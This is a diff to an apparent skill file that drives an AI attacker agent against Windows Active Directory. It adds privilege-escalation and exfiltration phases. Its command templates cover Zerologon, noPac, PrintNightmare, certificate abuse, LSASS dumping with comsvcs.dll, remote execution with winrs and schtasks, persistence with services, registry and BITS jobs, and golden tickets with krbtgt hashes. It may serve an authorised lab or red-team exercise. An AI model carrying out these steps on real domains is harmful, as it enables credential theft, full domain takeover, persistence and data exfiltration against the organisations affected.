@@ -1,6 +1,6 @@
 ---
 name: ad-attack
-description: Shared Active Directory attack runtime for an attacker agent on a domain-joined Windows host. Holds state.json, changes.json, capture/state scripts, and the mandatory execution protocol (pre-flight, capture brackets, write-back, rollback, and the per-task display-filter file). Do not invoke this skill for a technique. Use the phase skill named in the task (ad-discovery, ad-credential, ad-lateral, ad-collection, ad-persistence).
+description: Shared Active Directory attack runtime for an attacker agent on a domain-joined Windows host. Holds state.json, changes.json, capture/state scripts, and the mandatory execution protocol (pre-flight, capture brackets, write-back, rollback, and the per-task display-filter file). Do not invoke this skill for a technique. Use the phase skill named in the task (ad-discovery, ad-credential, ad-privesc, ad-lateral, ad-collection, ad-exfil, ad-persistence).
 ---
 
 # AD Attack Runtime
@@ -13,8 +13,10 @@ This is the **shared runtime** for attacker phase skills. It does not contain a 
 |------------------|-------|
 | `discovery.*` | `ad-discovery` |
 | `credential.*` | `ad-credential` |
+| `privesc.*` | `ad-privesc` |
 | `lateral.*` | `ad-lateral` |
 | `collection.*` | `ad-collection` |
+| `exfil.*` | `ad-exfil` |
 | `persistence.*` | `ad-persistence` |
 
 Always `cd` to this skill root (`~/.config/opencode/skills/ad-attack`) before `python scripts/...`. Attacks stay object-driven and stateful:
@@ -44,8 +46,10 @@ attacker/skills/
 │   └── wordlists/
 ├── ad-discovery/SKILL.md
 ├── ad-credential/SKILL.md
+├── ad-privesc/SKILL.md
 ├── ad-lateral/SKILL.md
 ├── ad-collection/SKILL.md
+├── ad-exfil/SKILL.md
 └── ad-persistence/SKILL.md
 ```
 
@@ -78,16 +82,29 @@ impacket is pure Python and runs natively on Windows; Kali is not required. Ever
 | `addcomputer` | `addcomputer.py` | `impacket-addcomputer` |
 | `rbcd` | `rbcd.py` | `impacket-rbcd` |
 | `smbpasswd` | `smbpasswd.py` | `impacket-smbpasswd` |
+| `GetLAPSPassword` | `GetLAPSPassword.py` | `impacket-GetLAPSPassword` |
+| `dpapi` | `dpapi.py` | `impacket-dpapi` |
+| `reg` | `reg.py` | `impacket-reg` |
+| `printerbug` | `printerbug.py` | `impacket-printerbug` |
+| `goldenPac` | `goldenPac.py` | `impacket-goldenPac` |
+| `wmipersist` | `wmipersist.py` | `impacket-wmipersist` |
+| `restorepassword` | `restorepassword.py` | `impacket-restorepassword` |
 
 Additional tools used by the extended techniques:
 
 | Tool | Used by | Invocation (PATH-independent) |
 |------|---------|-------------------------------|
 | `bloodhound` (bloodhound-python) | `discovery.bloodhound` | `python -m bloodhound -c All -u <user> -p <pw> -d <domain> -ns <dc-ip> --dns-tcp` (install: `pip install bloodhound`) |
+| `certipy` (certipy-ad) | `privesc.adcs-*`, `privesc.certifried` | `certipy find/req/auth/account` (install: `pip install certipy-ad`). If missing: `notes` + skip. |
+| `zerologon` | `privesc.zerologon` | `python -m zerologon <dc-netbios> <dc-ip>` then `secretsdump` / `restorepassword`. If missing: `notes` + skip. |
+| `noPac` | `privesc.nopac` | `python -m noPac <domain>/<user>:<pw> -dc-ip <dc> -dc-host <fqdn>`. If missing: `notes` + skip. |
+| `CVE_2021_1675` | `privesc.printnightmare` | `python -m CVE_2021_1675 ...` or lab `CVE-2021-1675.py`. If missing: `notes` + skip. Do not write a payload. |
 | `comsvcs.dll` (built-in) | `credential.lsass-dump` | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> <out> full` |
-| `winrs` (built-in) | `lateral.exec-winrm` | `winrs -r:<fqdn> -u:<domain>\<user> -p:<pw> "cmd /c <cmd>"` |
-| `schtasks` (built-in) | `lateral.exec-schtasks` | `schtasks /create /s <ip> /u <user> /p <pw> /tn <name> /tr <cmd> /sc once ...` |
+| `winrs` (built-in) | `lateral.exec-winrm`, `exfil.winrm` | `winrs -r:<fqdn> -u:<domain>\<user> -p:<pw> "cmd /c <cmd>"` |
+| `schtasks` (built-in) | `lateral.exec-schtasks`, `persistence.scheduled-task`, `privesc.schtask-system` | `schtasks /create ...` |
 | `sc` (built-in) | `persistence.service` | `sc create <name> binPath= "<cmd>" start= auto` (via remote shell) |
+| `reg` (built-in) | `persistence.run-key`, `credential.cached-logon` | `reg add` / `reg save` (local or via remote shell) |
+| `bitsadmin` / `Start-BitsTransfer` | `persistence.bits-job`, `exfil.bits` | `bitsadmin /create ...` or `Start-BitsTransfer` |
 | `tar` / `Compress-Archive` (built-in) | `collection.archive` | `tar -cf ...` or `powershell -c "Compress-Archive ..."` |
 | `pypykatz` / `mimikatz` (offline) | `credential.lsass-dump` parse | operator step, not an attack action |
 
@@ -440,7 +457,7 @@ Attacker-owned/decided values that are not discovered facts:
 
 ### 7. Environment-change ledger — `changes.json`
 
-Whenever a technique **creates or alters an object in the target domain** (not local tickets, pcaps, or `state.json` itself), append one record after the action succeeds. Do not revert the domain from this skill.
+Whenever a technique **creates or alters an object in the target domain** (not local tickets, pcaps, or `state.json` itself), append one record after the action succeeds. Do not revert the domain from this skill, except `privesc.zerologon`, which must restore the DC machine-account password in the same technique.
 
 ```
 python scripts/changes.py add '{"kind": "<kind>", "technique_id": "<technique-id>", "target": "<account-or-object>", "summary": "<what changed>", "reversal": "<operator command to undo>"}'
@@ -460,7 +477,7 @@ Task text names a **phase skill**, not `ad-attack`:
 Use the <phase-skill> skill: using the <field> of <object>, execute <technique-id> against <target-ref>.
 ```
 
-`<phase-skill>` is `ad-discovery`, `ad-credential`, `ad-lateral`, `ad-collection`, or `ad-persistence` according to the technique id prefix.
+`<phase-skill>` is `ad-discovery`, `ad-credential`, `ad-privesc`, `ad-lateral`, `ad-collection`, `ad-exfil`, or `ad-persistence` according to the technique id prefix.
 
 Reference grammar:
 
@@ -475,8 +492,10 @@ Examples:
 Use the ad-discovery skill: execute discovery.orientation against domain.
 Use the ad-discovery skill: execute discovery.port-scan against host 172.16.24.11.
 Use the ad-credential skill: using the password of user alice, execute credential.kerberoast against domain.
+Use the ad-privesc skill: using the password of user alice, execute privesc.adcs-find against domain.
 Use the ad-lateral skill: using the ntlm_hash of user svc_backup, execute lateral.pth-psexec against host 172.16.24.11.
 Use the ad-collection skill: using the password of user alice, execute collection.share-download against host 172.16.24.11.
+Use the ad-exfil skill: using the files of campaign, execute exfil.smb against host 172.16.24.11.
 Use the ad-persistence skill: using the ntlm_hash of user krbtgt, execute persistence.golden-ticket against domain.
 ```
 
